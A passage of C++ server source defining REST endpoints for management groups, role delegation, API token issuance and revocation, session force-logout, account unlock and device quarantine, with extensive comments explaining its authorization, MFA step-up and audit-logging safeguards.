                 auto id = req.matches[1].str();
                 auto g = mgmt_store->get_group(id);
                 if (!g) {
                     res.status = 404;
                     res.set_content(error_json("group not found"), "application/json");
                     return;
                 }
                 auto members = mgmt_store->get_members(id);
                 JArr member_arr;
                 for (const auto& m : members)
                     member_arr.add(JObj()
                                        .add("agent_id", m.agent_id)
                                        .add("source", m.source)
                                        .add("added_at", m.added_at));

                 auto data = JObj()
                                 .add("id", g->id)
                                 .add("name", g->name)
                                 .add("description", g->description)
                                 .add("parent_id", g->parent_id)
                                 .add("membership_type", g->membership_type)
                                 .add("scope_expression", g->scope_expression)
                                 .add("created_by", g->created_by)
                                 .add("created_at", g->created_at)
                                 .add("updated_at", g->updated_at)
                                 .raw("members", member_arr.str());
                 res.set_content(ok_json(data.str()), "application/json");
             });

    // Update group (rename, re-parent, change description/membership)
    sink.Put(R"(/api/v1/management-groups/([a-f0-9]+))", [auth_fn, perm_fn, audit_fn,
                                                          mgmt_store](const httplib::Request& req,
                                                                      httplib::Response& res) {
        if (!perm_fn(req, res, "ManagementGroup", "Write"))
            return;
        if (!mgmt_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto id = req.matches[1].str();
        auto existing = mgmt_store->get_group(id);
        if (!existing) {
            res.status = 404;
            res.set_content(error_json("group not found"), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded()) {
            res.status = 400;
            res.set_content(error_json("invalid JSON"), "application/json");
            return;
        }

        auto updated = *existing;
        if (body.contains("name"))
            updated.name = body["name"].get<std::string>();
        if (body.contains("description"))
            updated.description = body["description"].get<std::string>();
        if (body.contains("parent_id"))
            updated.parent_id = body["parent_id"].get<std::string>();
        if (body.contains("membership_type"))
            updated.membership_type = body["membership_type"].get<std::string>();
        if (body.contains("scope_expression"))
            updated.scope_expression = body["scope_expression"].get<std::string>();

        if (id == ManagementGroupStore::kRootGroupId && !updated.parent_id.empty()) {
            res.status = 400;
            res.set_content(error_json("cannot re-parent root group"), "application/json");
            return;
        }

        if (!updated.parent_id.empty() && updated.parent_id != existing->parent_id) {
            auto descendants = mgmt_store->get_descendant_ids(id);
            if (std::find(descendants.begin(), descendants.end(), updated.parent_id) !=
                descendants.end()) {
                res.status = 400;
                res.set_content(error_json("re-parenting would create a cycle"),
                                "application/json");
                return;
            }
            auto ancestors = mgmt_store->get_ancestor_ids(updated.parent_id);
            if (ancestors.size() >= 4) {
                res.status = 400;
                res.set_content(error_json("maximum hierarchy depth (5) exceeded"),
                                "application/json");
                return;
            }
        }

        auto result = mgmt_store->update_group(updated);
        if (!result) {
            res.status = 400;
            res.set_content(error_json(result.error()), "application/json");
            return;
        }
        audit_fn(req, "management_group.update", "success", "ManagementGroup", id, updated.name);
        res.set_content(ok_json(JObj().add("updated", true).str()), "application/json");
    });

    sink.Delete(
        R"(/api/v1/management-groups/([a-f0-9]+))",
        [perm_fn, audit_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "ManagementGroup", "Delete"))
                return;
            if (!mgmt_store) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto id = req.matches[1].str();
            auto result = mgmt_store->delete_group(id);
            if (!result) {
                res.status = (result.error() == "cannot delete root group") ? 403 : 404;
                res.set_content(error_json(result.error()), "application/json");
                return;
            }
            audit_fn(req, "management_group.delete", "success", "ManagementGroup", id, "");
            res.set_content(ok_json(JObj().add("deleted", true).str()), "application/json");
        });

    // Members
    sink.Post(R"(/api/v1/management-groups/([a-f0-9]+)/members)",
              [perm_fn, audit_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
                  if (!perm_fn(req, res, "ManagementGroup", "Write"))
                      return;
                  if (!mgmt_store) {
                      res.status = 503;
                      res.set_content(error_json("service unavailable", 503), "application/json");
                      return;
                  }

                  auto group_id = req.matches[1].str();
                  auto body = nlohmann::json::parse(req.body, nullptr, false);
                  auto agent_id = body.value("agent_id", "");
                  if (agent_id.empty()) {
                      res.status = 400;
                      res.set_content(error_json("agent_id required"), "application/json");
                      return;
                  }
                  mgmt_store->add_member(group_id, agent_id);
                  audit_fn(req, "management_group.add_member", "success", "ManagementGroup",
                           group_id, agent_id);
                  res.status = 201;
                  res.set_content(ok_json(JObj().add("added", true).str()), "application/json");
              });

    sink.Delete(
        R"(/api/v1/management-groups/([a-f0-9]+)/members/(.+))",
        [perm_fn, audit_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "ManagementGroup", "Write"))
                return;
            if (!mgmt_store) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto group_id = req.matches[1].str();
            auto agent_id = req.matches[2].str();
            mgmt_store->remove_member(group_id, agent_id);
            audit_fn(req, "management_group.remove_member", "success", "ManagementGroup", group_id,
                     agent_id);
            res.set_content(ok_json(JObj().add("removed", true).str()), "application/json");
        });

    // ── Management Group Roles (/api/v1/management-groups/:id/roles) ────

    sink.Get(R"(/api/v1/management-groups/([a-f0-9]+)/roles)",
             [perm_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "ManagementGroup", "Read"))
                     return;
                 if (!mgmt_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto group_id = req.matches[1].str();
                 auto roles = mgmt_store->get_group_roles(group_id);
                 JArr arr;
                 for (const auto& r : roles) {
                     arr.add(JObj()
                                 .add("group_id", r.group_id)
                                 .add("principal_type", r.principal_type)
                                 .add("principal_id", r.principal_id)
                                 .add("role_name", r.role_name));
                 }
                 res.set_content(ok_json(arr.str()), "application/json");
             });

    sink.Post(R"(/api/v1/management-groups/([a-f0-9]+)/roles)",
              [auth_fn, perm_fn, audit_fn, mgmt_store, rbac_store](const httplib::Request& req,
                                                                   httplib::Response& res) {
                  auto session = auth_fn(req, res);
                  if (!session)
                      return;
                  if (!mgmt_store || !rbac_store) {
                      res.status = 503;
                      res.set_content(error_json("service unavailable", 503), "application/json");
                      return;
                  }

                  auto group_id = req.matches[1].str();
                  auto body = nlohmann::json::parse(req.body, nullptr, false);
                  if (body.is_discarded()) {
                      res.status = 400;
                      res.set_content(error_json("invalid JSON"), "application/json");
                      return;
                  }

                  auto principal_type = body.value("principal_type", "user");
                  auto principal_id = body.value("principal_id", "");
                  auto role_name = body.value("role_name", "");

                  if (principal_id.empty() || role_name.empty()) {
                      res.status = 400;
                      res.set_content(error_json("principal_id and role_name required"),
                                      "application/json");
                      return;
                  }

                  if (role_name != "Operator" && role_name != "Viewer") {
                      res.status = 403;
                      res.set_content(error_json("only Operator and Viewer roles can be delegated"),
                                      "application/json");
                      return;
                  }

                  bool authorized =
                      rbac_store->check_permission(session->username, "ManagementGroup", "Write");
                  if (!authorized) {
                      auto group_roles = mgmt_store->get_group_roles(group_id);
                      for (const auto& gr : group_roles) {
                          if (gr.principal_type == "user" && gr.principal_id == session->username &&
                              gr.role_name == "ITServiceOwner") {
                              authorized = true;
                              break;
                          }
                      }
                  }
                  if (!authorized) {
                      res.status = 403;
                      res.set_content(error_json("forbidden"), "application/json");
                      return;
                  }

                  GroupRoleAssignment assignment;
                  assignment.group_id = group_id;
                  assignment.principal_type = principal_type;
                  assignment.principal_id = principal_id;
                  assignment.role_name = role_name;

                  auto result = mgmt_store->assign_role(assignment);
                  if (!result) {
                      res.status = 400;
                      res.set_content(error_json(result.error()), "application/json");
                      return;
                  }
                  audit_fn(req, "management_group.assign_role", "success", "ManagementGroup",
                           group_id, principal_id + ":" + role_name);
                  res.status = 201;
                  res.set_content(ok_json(JObj().add("assigned", true).str()), "application/json");
              });

    sink.Delete(
        R"(/api/v1/management-groups/([a-f0-9]+)/roles)",
        [auth_fn, perm_fn, audit_fn, mgmt_store, rbac_store](const httplib::Request& req,
                                                             httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!mgmt_store || !rbac_store) {
                res.status = 503;
                res.set_content(error_json("service unavailable", 503), "application/json");
                return;
            }

            auto group_id = req.matches[1].str();
            auto body = nlohmann::json::parse(req.body, nullptr, false);
            if (body.is_discarded()) {
                res.status = 400;
                res.set_content(error_json("invalid JSON"), "application/json");
                return;
            }

            auto principal_type = body.value("principal_type", "user");
            auto principal_id = body.value("principal_id", "");
            auto role_name = body.value("role_name", "");

            bool authorized =
                rbac_store->check_permission(session->username, "ManagementGroup", "Write");
            if (!authorized) {
                auto group_roles = mgmt_store->get_group_roles(group_id);
                for (const auto& gr : group_roles) {
                    if (gr.principal_type == "user" && gr.principal_id == session->username &&
                        gr.role_name == "ITServiceOwner") {
                        authorized = true;
                        break;
                    }
                }
            }
            if (!authorized) {
                res.status = 403;
                res.set_content(error_json("forbidden"), "application/json");
                return;
            }

            mgmt_store->unassign_role(group_id, principal_type, principal_id, role_name);
            audit_fn(req, "management_group.unassign_role", "success", "ManagementGroup", group_id,
                     principal_id + ":" + role_name);
            res.set_content(ok_json(JObj().add("unassigned", true).str()), "application/json");
        });

    // ── API Tokens (/api/v1/tokens) ──────────────────────────────────────

    sink.Get("/api/v1/tokens",
             [auth_fn, perm_fn, token_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "ApiToken", "Read"))
                     return;
                 // #347 CH-3: a failed DB open must read as 503, never as an
                 // empty list or 404 — is_open() distinguishes "no rows" from
                 // "no database".
                 if (!token_store || !token_store->is_open()) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto session = auth_fn(req, res);
                 if (!session)
                     return;

                 auto tokens = token_store->list_tokens(session->username);
                 JArr arr;
                 for (const auto& t : tokens) {
                     JObj item;
                     item.add("token_id", t.token_id)
                         .add("name", t.name)
                         .add("principal_id", t.principal_id)
                         .add("created_at", t.created_at)
                         .add("expires_at", t.expires_at)
                         .add("last_used_at", t.last_used_at)
                         .add("revoked", t.revoked);
                     if (!t.scope_service.empty())
                         item.add("scope_service", t.scope_service);
                     arr.add(item);
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(tokens.size())),
                                 "application/json");
             });

    sink.Post("/api/v1/tokens", [auth_fn, perm_fn, audit_fn, step_up_fn, token_store, rbac_store,
                                 mgmt_store, tag_store, metrics_registry](
                                    const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "ApiToken", "Write"))
            return;
        if (!token_store || !token_store->is_open()) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto session = auth_fn(req, res);
        if (!session)
            return;
        // PR2 — MFA step-up gate. Token issuance is high-risk
        // (creates a long-lived bearer credential); require fresh MFA
        // proof so a hijacked session cannot mint replacement creds.
        if (step_up_fn && !step_up_fn(req, res, *session, "POST /api/v1/tokens"))
            return;

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        auto name = body.value("name", "");
        auto expires_at = body.value("expires_at", int64_t{0});
        auto scope_service = body.value("scope_service", "");

        // UP-H2 (gov Gate 4, unhappy-path): clamp user-controlled string
        // length BEFORE any audit emission. An unbounded `name` would be
        // bound into SQLite per request and (combined with the cheap-to-
        // trigger CSPRNG-failure path) hand an attacker an audit-DB DoS
        // during early-boot entropy exhaustion windows. 256 chars is well
        // above any legitimate token name (cf. settings_routes HTMX name
        // input cap) and well below the SQLite text-bind buffer cost
        // worth worrying about. Validation 400s are deliberately not
        // audited — oversized input is request-level garbage and we
        // already audit on success; not auditing here closes the audit-
        // amplification vector outright.
        if (name.size() > 256) {
            res.status = 400;
            res.set_content(error_json("invalid_input_length: name exceeds 256 chars"),
                            "application/json");
            return;
        }
        if (scope_service.size() > 256) {
            res.status = 400;
            res.set_content(error_json("invalid_input_length: scope_service exceeds 256 chars"),
                            "application/json");
            return;
        }

        if (!scope_service.empty()) {
            if (!rbac_store || !rbac_store->is_rbac_enabled()) {
                res.status = 400;
                res.set_content(error_json("service-scoped tokens require RBAC to be enabled"),
                                "application/json");
                return;
            }
            bool authorized =
                rbac_store->check_permission(session->username, "ManagementGroup", "Write");
            if (!authorized && mgmt_store) {
                auto svc_group = mgmt_store->find_group_by_name("Service: " + scope_service);
                if (svc_group) {
                    auto group_roles = mgmt_store->get_group_roles(svc_group->id);
                    for (const auto& gr : group_roles) {
                        if (gr.principal_type == "user" && gr.principal_id == session->username &&
                            gr.role_name == "ITServiceOwner") {
                            authorized = true;
                            break;
                        }
                    }
                }
            }
            if (!authorized) {
                res.status = 403;
                res.set_content(error_json("ITServiceOwner authority required for service '" +
                                           scope_service + "'"),
                                "application/json");
                return;
            }
        }

        auto result = token_store->create_token(name, session->username, expires_at, scope_service);
        if (!result) {
            // sre-1 (gov Gate 6): Prometheus signal for CSPRNG failure so
            // on-call has a paging surface short of grepping audit logs.
            // Increment BEFORE the audit-emission try/catch so the metric
            // is never lost to an audit-pipeline exception.
            if (metrics_registry) {
                metrics_registry
                    ->counter("yuzu_secure_random_failure_total",
                              {{"reason", "prng_failure"}, {"site", "api_token"}})
                    .increment();
            }
            // F-002 (gov Gate 2, security-guardian): on CSPRNG entropy
            // exhaustion the request returns an error but historically emitted
            // no audit. SOC 2 CC7.2/CC7.3 require security-relevant failure
            // conditions to be auditable. Emit the failure row BEFORE the
            // response so a crash mid-response still leaves the audit trail.
            // The `csprng_unavailable:` marker lets SIEM rules filter this
            // distinct failure class from generic create failures.
            //
            // UP-H1 (gov Gate 4): wrap the audit call in try/catch so an
            // exception from the audit pipeline does not abort the 503
            // response, and capture the bool return so a silent persist
            // failure (audit DB locked / wedged) surfaces as a
            // `Sec-Audit-Failed: true` header and an `audit_emitted=false`
            // envelope field. Mirrors the PR #883 HIGH-2 session-revocation
            // pattern: operator's "deny NOW" intent (returning the 503)
            // takes precedence over a partial-SOC2-evidence chain — but
            // we mark the partial-success on the response so clients/SIEM
            // cannot read a clean 503 as proof the audit row landed.
            bool audit_emitted = false;
            try {
                audit_emitted = audit_fn(req, "api_token.create", "failure", "ApiToken", name,
                                         "csprng_unavailable: " + result.error());
            } catch (const std::exception& ex) {
                spdlog::error("api_token.create audit emission threw: {}", ex.what());
                audit_emitted = false;
            } catch (...) {
                spdlog::error("api_token.create audit emission threw unknown");
                audit_emitted = false;
            }
            // sre-2 (gov Gate 6, sre): CSPRNG failure is a server-side
            // condition (entropy exhaustion) — clients with retry logic
            // need a 5xx so they back off and retry, and LB / SRE rules
            // page on 5xx_rate not 4xx_rate. Retry-After: 5 gives the
            // entropy pool a window to refill before the next attempt.
            // Closes follow-up #1046.
            res.status = 503;
            res.set_header("Retry-After", "5");
            if (!audit_emitted)
                res.set_header("Sec-Audit-Failed", "true");
            JObj envelope_err;
            envelope_err.add("code", 503).add("message", "CSPRNG unavailable: " + result.error());
            JObj envelope;
            envelope.raw("error", envelope_err.str())
                .add("audit_emitted", audit_emitted)
                .raw("meta", R"({"api_version":"v1"})");
            res.set_content(envelope.str(), "application/json");
            return;
        }
        auto detail = scope_service.empty() ? "" : "scope_service=" + scope_service;
        // Success-path audit fire-and-forget — bool intentionally discarded
        // because the response is 201 Created regardless; if the audit row
        // fails to persist, the AuditStore::emit_failed_ counter still
        // increments and the operator-visible metric paths catch it.
        (void)audit_fn(req, "api_token.create", "success", "ApiToken", name, detail);
        res.status = 201;
        JObj resp;
        resp.add("token", *result).add("name", name);
        if (!scope_service.empty())
            resp.add("scope_service", scope_service);
        res.set_content(ok_json(resp.str()), "application/json");
    });

    sink.Delete(R"(/api/v1/tokens/(.+))", [auth_fn, perm_fn, audit_fn, step_up_fn, token_store](
                                              const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "ApiToken", "Delete"))
            return;
        if (!token_store || !token_store->is_open()) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto session = auth_fn(req, res);
        if (!session)
            return;
        // PR2 — MFA step-up gate. Token revocation can kill an
        // operator's automation; require fresh MFA proof.
        if (step_up_fn && !step_up_fn(req, res, *session, "DELETE /api/v1/tokens/{id}"))
            return;

        auto token_id = req.matches[1].str();

        // Owner-scoped revocation (fixes #222). `ApiToken:Delete` alone is
        // not sufficient — callers must either own the token or hold the
        // global admin role. Without this a user with Delete permission
        // could enumerate and revoke any other user's tokens (IDOR).
        //
        // Both the missing-id and the not-owner cases return 404 with an
        // identical response body so the endpoint does not become an
        // enumeration oracle (gov-Gate2 sec-M3). The audit log still
        // distinguishes the two cases via the `result` field (`denied`
        // vs. no event) and the `owner=` detail so forensics can see who
        // tried to revoke whose token.
        auto existing = token_store->get_token(token_id);
        bool denied = existing && existing->principal_id != session->username &&
                      auth::effective_role(*session) != auth::Role::admin; // honour JIT elevation
        if (!existing || denied) {
            if (denied) {
                audit_fn(req, "api_token.revoke", "denied", "ApiToken", token_id,
                         "owner=" + existing->principal_id);
            }
            res.status = 404;
            res.set_content(error_json("token not found"), "application/json");
            return;
        }

        bool revoked = token_store->revoke_token(token_id);
        if (!revoked) {
            // Either the token vanished between get and revoke, or the
            // revoke call itself failed. Treat as not-found for the client.
            res.status = 404;
            res.set_content(error_json("token not found"), "application/json");
            return;
        }
        audit_fn(req, "api_token.revoke", "success", "ApiToken", token_id,
                 "owner=" + existing->principal_id);
        res.set_content(ok_json(JObj().add("revoked", true).str()), "application/json");
    });

    // ── Sessions (/api/v1/sessions) ──────────────────────────────────────
    //
    // Two entry points to `AuthManager::invalidate_user_sessions` (the
    // dual-write primitive that wipes both `auth.db` rows and the
    // in-memory `sessions_` map):
    //   - DELETE /api/v1/sessions?username=<name> — admin force-logout
    //     of another user. Cookie sessions only; API tokens deliberately
    //     left intact (operator might be revoking a leaked cookie while
    //     leaving CI/CD automation running).
    //   - DELETE /api/v1/sessions/me — caller signs out everywhere.
    //     BOTH cookie sessions AND API tokens are revoked, because the
    //     operator mental model for "Sign out everywhere" is the
    //     stolen-laptop scenario where every credential bearing the
    //     user's identity must die. Closes UP-13.
    //
    // Self-target guard differs from the DELETE-user / role-demotion
    // guards in `settings_routes.cpp`: revoking your own sessions is
    // *recoverable* (re-auth and you are back), so the admin path
    // permits self-target but routes through the `session.revoke_all.self`
    // audit action so SIEM rules can distinguish operator self-service
    // from a sibling-admin force-logout. Compliance officer's CC6.6
    // evidence chain depends on that split.

    // DELETE /api/v1/sessions/me — self-revoke. No admin gate; auth
    // alone is sufficient. Rejected for MCP-tier and service-scoped
    // tokens — those credential classes have no other write privilege
    // and accepting them here would create a novel DoS surface against
    // the human owner (sec-M2 / UP-14).
    sink.Delete("/api/v1/sessions/me", [auth_fn, audit_fn, session_revoke_fn](
                                           const httplib::Request& req, httplib::Response& res) {
        auto session = auth_fn(req, res);
        if (!session)
            return;
        if (session->username.empty()) {
            // Defence-in-depth (sec-M1): require_auth shouldn't ever
            // produce an empty username, but if it does we must NOT fall
            // through to revoke — comparing two empty strings would
            // mis-attribute the action.
            res.status = 500;
            res.set_content(error_json("session has empty username", 500), "application/json");
            return;
        }
        // Audit emission helper — wraps audit_fn so we can capture both
        // silent persistence failures (bool=false) and exceptions, and
        // surface either via `Sec-Audit-Failed: true` + `audit_emitted`
        // in the response body. HIGH-2 on PR #883: a 200 OK response
        // that hides a lost audit row is fictional SOC 2 CC6.6/CC7.2
        // evidence.
        auto try_audit = [&audit_fn, &req](const std::string& action, const std::string& result,
                                           const std::string& target_type,
                                           const std::string& target_id,
                                           const std::string& detail) -> RestApiV1::AuditEmission {
            try {
                bool ok = audit_fn(req, action, result, target_type, target_id, detail);
                return RestApiV1::AuditEmission{ok, /*threw=*/false};
            } catch (const std::exception& e) {
                spdlog::error("audit_fn threw on session-revoke action={} target={}: {}", action,
                              target_id, e.what());
                return RestApiV1::AuditEmission{false, /*threw=*/true};
            } catch (...) {
                spdlog::error("audit_fn threw unknown on session-revoke action={} target={}",
                              action, target_id);
                return RestApiV1::AuditEmission{false, /*threw=*/true};
            }
        };

        if (!session->mcp_tier.empty() || !session->token_scope_service.empty()) {
            // sec-M2: a leaked readonly MCP token, or a service-scoped
            // automation token, must not be able to wipe its principal's
            // interactive cookies. Use the dashboard or a session cookie
            // for that.
            const auto audit =
                try_audit("session.revoke_all.self", "denied", "User", session->username,
                          "non-interactive credential rejected (mcp_tier='" + session->mcp_tier +
                              "' scope='" + session->token_scope_service + "')");
            if (!audit.emitted)
                res.set_header("Sec-Audit-Failed", "true");
            res.status = 403;
            res.set_content(
                error_json("self-revoke requires an interactive session, not an API token", 403),
                "application/json");
            return;
        }
        if (!session_revoke_fn) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
        const auto result = session_revoke_fn(session->username, /*revoke_api_tokens=*/true);
        const std::string audit_result = result.db_persisted ? "success" : "partial";
        const std::string detail =
            "count=" + std::to_string(result.cookie_sessions_revoked) +
            " api_tokens_revoked=" + std::to_string(result.api_tokens_revoked) +
            (result.db_persisted ? "" : " db_error=true");
        const auto audit =
            try_audit("session.revoke_all.self", audit_result, "User", session->username, detail);
        // CC6.7 disposition: clear the caller's cookie on the response so
        // the client side completes the revocation. Mirrors POST /logout
        // attribute set; the `Secure` flag (set on issuance based on
        // https config) is omitted here to match the logout precedent —
        // the cookie attributes only need to identify the cookie for
        // browser deletion, not match the original issuance flags.
        res.set_header("Set-Cookie", "yuzu_session=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0");
        if (!audit.emitted)
            res.set_header("Sec-Audit-Failed", "true");
        res.set_content(
            ok_json(JObj()
                        .add("revoked", static_cast<int64_t>(result.cookie_sessions_revoked))
                        .add("api_tokens_revoked", static_cast<int64_t>(result.api_tokens_revoked))
                        .add("db_persisted", result.db_persisted)
                        .add("audit_emitted", audit.emitted)
                        .str()),
            "application/json");
    });

    // DELETE /api/v1/sessions?username=<name> — admin-only force-logout.
    // Gated by `UserManagement:Write` because the action mutates a user's
    // access state (parity with role change / disable). `username` query
    // parameter is required AND validated with `is_valid_username` so a
    // NUL byte in the input cannot truncate the SQL bind in a way that
    // diverges from the in-memory `==` comparison (sec-H1 / UP-8).
    sink.Delete("/api/v1/sessions", [auth_fn, perm_fn, audit_fn, step_up_fn, session_revoke_fn](
                                        const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "UserManagement", "Write"))
            return;
        auto session = auth_fn(req, res);
        if (!session)
            return;
        // PR2 Gate 2 sec-M2: empty-username defensive check runs FIRST
        // (sec-M1 invariant) — never emit an audit row carrying an
        // empty principal, even from the step-up gate. Step-up runs
        // immediately after, before any state mutation.
        if (session->username.empty()) {
            // sec-M1: empty caller username would mis-attribute the
            // self-vs-cross-user audit action selection below.
            res.status = 500;
            res.set_content(error_json("session has empty username", 500), "application/json");
            return;
        }
        // PR2 — MFA step-up gate. Admin force-logout of another user
        // is high-risk; require fresh MFA proof.
        if (step_up_fn && !step_up_fn(req, res, *session, "DELETE /api/v1/sessions"))
            return;
        if (!session_revoke_fn) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
        const auto username = req.get_param_value("username");
        if (username.empty()) {
            res.status = 400;
            res.set_content(error_json("username query parameter required", 400),
                            "application/json");
            return;
        }
        if (!is_valid_username(username)) {
            // sec-H1: reject NUL bytes, control characters, newlines.
            // Without this the audit `target_id` records the full
            // attacker-controlled string while the SQL bind silently
            // truncates at NUL — different rows hit memory vs disk.
            res.status = 400;
            res.set_content(error_json("invalid username format", 400), "application/json");
            return;
        }
        const auto result = session_revoke_fn(username, /*revoke_api_tokens=*/false);
        // Self-revoke via the admin path — distinguish in audit so
        // forensics can tell operator self-service apart from a sibling
        // admin force-logout (CC6.6 evidence).
        const std::string action =
            (username == session->username) ? "session.revoke_all.self" : "session.revoke_all";
        const std::string audit_result = result.db_persisted ? "success" : "partial";
        const std::string detail = "count=" + std::to_string(result.cookie_sessions_revoked) +
                                   (result.db_persisted ? "" : " db_error=true");
        // HIGH-2 on PR #883 — wrap in try/catch and capture the audit_fn
        // bool return so a silent persist failure (audit DB locked /
        // disk full) or an exception path doesn't masquerade as 200 OK
        // SOC 2 evidence. The `Sec-Audit-Failed` response header gives
        // SRE/SIEM scrapers an out-of-band signal; the `audit_emitted`
        // body field gives the API client the same signal.
        bool audit_emitted = true;
        try {
            audit_emitted = audit_fn(req, action, audit_result, "User", username, detail);
        } catch (const std::exception& e) {
            spdlog::error("audit_fn threw on session-revoke action={} target={}: {}", action,
                          username, e.what());
            audit_emitted = false;
        } catch (...) {
            spdlog::error("audit_fn threw unknown on session-revoke action={} target={}", action,
                          username);
            audit_emitted = false;
        }
        if (!audit_emitted)
            res.set_header("Sec-Audit-Failed", "true");
        res.set_content(
            ok_json(JObj()
                        .add("username", username)
                        .add("revoked", static_cast<int64_t>(result.cookie_sessions_revoked))
                        .add("db_persisted", result.db_persisted)
                        .add("audit_emitted", audit_emitted)
                        .str()),
            "application/json");
    });

    // POST /api/v1/users/<username>/unlock — admin clears an account's
    // lockout counter (SOC 2 CC6.3). Gated by `UserManagement:Write` (parity
    // with role change / session force-logout). Self-target is permitted:
    // clearing your own lockout is recoverable, same reasoning as the
    // self-revoke at the sessions route above. The lockout already
    // auto-expires after the window — this is the operability path for an
    // operator who can't wait it out. `username` is validated with
    // `is_valid_username` so a NUL byte can't diverge the audit target_id
    // from the SQL bind (sec-H1 parity with the sessions route).
    sink.Post(
        R"(/api/v1/users/([^/]+)/unlock)",
        [auth_fn, perm_fn, audit_fn, step_up_fn, lockout_clear_fn](const httplib::Request& req,
                                                                   httplib::Response& res) {
            // Brand-new route — emit the structured A4 error envelope
            // (correlation_id / retry_after_ms / remediation) so new code moves
            // the REST surface toward the agentic-first idiom.
            const auto cid = detail::make_correlation_id();
            res.set_header("X-Correlation-Id", cid);
            if (!perm_fn(req, res, "UserManagement", "Write"))
                return;
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (session->username.empty()) {
                // sec-M1: an empty caller username would mis-attribute the
                // audit row; never proceed past it.
                res.status = 500;
                res.set_content(detail::error_json_a4(500, "session has empty username", cid),
                                "application/json");
                return;
            }
            // High-risk admin action on another principal's access state —
            // require fresh MFA proof (parity with session force-logout).
            if (step_up_fn && !step_up_fn(req, res, *session, "POST /api/v1/users/{name}/unlock"))
                return;
            if (!lockout_clear_fn) {
                res.status = 503;
                res.set_content(
                    detail::error_json_a4(503, "lockout subsystem unavailable", cid,
                                          /*retry_after_ms=*/5000,
                                          "account lockout requires the persistent auth.db; start "
                                          "the server with --data-dir"),
                    "application/json");
                return;
            }
            const auto username = req.matches[1].str();
            if (username.empty() || !is_valid_username(username)) {
                res.status = 400;
                res.set_content(detail::error_json_a4(400, "invalid username format", cid,
                                                      "username must match the allowed format"),
                                "application/json");
                return;
            }
            // Audit emission wrapper — parity with the sessions-revoke route
            // (HIGH-2 on PR #883): a lost or throwing audit write on this
            // CC6.3-evidence action must NOT masquerade as a clean 200. The
            // `Sec-Audit-Failed` response header + `audit_emitted` body field
            // give SRE/SIEM and the API client an out-of-band signal.
            auto try_audit = [&audit_fn, &req, &username](const std::string& result,
                                                          const std::string& detail) -> bool {
                try {
                    return audit_fn(req, "auth.lockout.cleared", result, "User", username, detail);
                } catch (const std::exception& e) {
                    spdlog::error("audit_fn threw on auth.lockout.cleared target={}: {}", username,
                                  e.what());
                    return false;
                } catch (...) {
                    spdlog::error("audit_fn threw unknown on auth.lockout.cleared target={}",
                                  username);
                    return false;
                }
            };
            const bool ok = lockout_clear_fn(username);
            if (!ok) {
                res.status = 500;
                // Best-effort failure audit so a lost unlock is still visible
                // in the CC6.3 evidence chain.
                if (!try_audit("error", "admin_unlock"))
                    res.set_header("Sec-Audit-Failed", "true");
                res.set_content(detail::error_json_a4(500, "failed to clear lockout", cid),
                                "application/json");
                return;
            }
            const bool audit_emitted = try_audit("ok", "admin_unlock");
            if (!audit_emitted)
                res.set_header("Sec-Audit-Failed", "true");
            res.set_content(ok_json(JObj()
                                        .add("username", username)
                                        .add("unlocked", true)
                                        .add("audit_emitted", audit_emitted)
                                        .str()),
                            "application/json");
        });

    // ── Quarantine (/api/v1/quarantine) ──────────────────────────────────

    sink.Get("/api/v1/quarantine",
             [perm_fn, quarantine_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Security", "Read"))
                     return;
                 if (!quarantine_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto records = quarantine_store->list_quarantined();
                 JArr arr;
                 for (const auto& r : records) {
                     arr.add(JObj()
                                 .add("agent_id", r.agent_id)
                                 .add("status", r.status)
                                 .add("quarantined_by", r.quarantined_by)
                                 .add("quarantined_at", r.quarantined_at)
                                 .add("whitelist", r.whitelist)
                                 .add("reason", r.reason));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(records.size())),
                                 "application/json");
             });

    sink.Post("/api/v1/quarantine", [auth_fn, perm_fn, audit_fn, quarantine_store](
                                        const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "Security", "Execute"))
            return;
        if (!quarantine_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        auto agent_id = body.value("agent_id", "");
        auto reason = body.value("reason", "");
        auto whitelist = body.value("whitelist", "");

        auto session = auth_fn(req, res);
        std::string by = session ? session->username : "system";

        auto result = quarantine_store->quarantine_device(agent_id, by, reason, whitelist);
        if (!result) {
            res.status = 400;
            res.set_content(error_json(result.error()), "application/json");
            return;
        }
        audit_fn(req, "quarantine.enable", "success", "Security", agent_id, reason);
        res.status = 201;
        res.set_content(ok_json(JObj().add("quarantined", true).str()), "application/json");
    });

    sink.Delete(
        R"(/api/v1/quarantine/(.+))",
